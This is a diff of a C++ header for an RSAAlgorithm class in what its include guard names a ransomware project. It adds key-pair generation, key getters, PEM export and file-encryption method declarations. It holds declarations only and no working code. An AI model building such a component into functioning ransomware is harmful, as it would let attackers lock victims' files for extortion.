@@ -5,10 +5,10 @@
 #ifndef RANSOMWARE_RSA_ALGO_H
 #define RANSOMWARE_RSA_ALGO_H
 
-#include <openssl/rsa.h>
-#include <openssl/pem.h>
 #include <boost/filesystem/path.hpp>
 #include <iostream>
+#include <openssl/rsa.h>
+
 
 #include "algorithm.h"
 
@@ -16,7 +16,11 @@ class RSAAlgorithm : public Algorithm {
 
 private:
     std::vector<boost::filesystem::path> _files;
-    static RSA* _privateKey;
+    char *_privateKey;
+    char *_publicKey;
+    static RSA *_keypair;
+
+    bool generateKeyPair();
 
 public:
     RSAAlgorithm();
@@ -25,11 +29,13 @@ public:
     void encrypt(std::vector<boost::filesystem::path>&);
     void decrypt();
 
-    void createPrivateKey();
-    void createPublicKey();
+    void createPrivateKey(bool file);
+    void createPublicKey(bool file);
 
-    void getPrivateKey();
-    void getPublicKey();
+    char* getPrivateKey();
+    char* getPublicKey();
+
+    void writePrivateKeyToPEMFile();
 };
 
 
